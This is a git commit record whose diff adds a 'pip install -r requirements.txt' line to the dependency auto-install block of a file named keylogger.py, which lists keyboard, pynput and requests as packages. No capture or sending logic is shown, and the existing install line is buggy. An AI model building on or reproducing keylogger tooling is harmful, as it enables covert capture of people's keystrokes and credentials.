53bca7935ea8a7873d744a424af2e704347811e8
Ross Greenall <rossgreenall@gmail.com>
2023-09-05 19:39:00 +0100

    Added new line for install, unsure if required?

--- keylogger.py
+++ keylogger.py
@@ -17,6 +17,7 @@ if sys.version_info.major >= 3:
     except ModuleNotFoundError:
         packages = ["keyboard","pynput", "json", "requests"]
         for package in packages:
+            subprocess.call("pip install -r requirements.txt", shell=True)
             subprocess.call("pip install -r" + ' '.join(package), shell=True)
 
     finally:
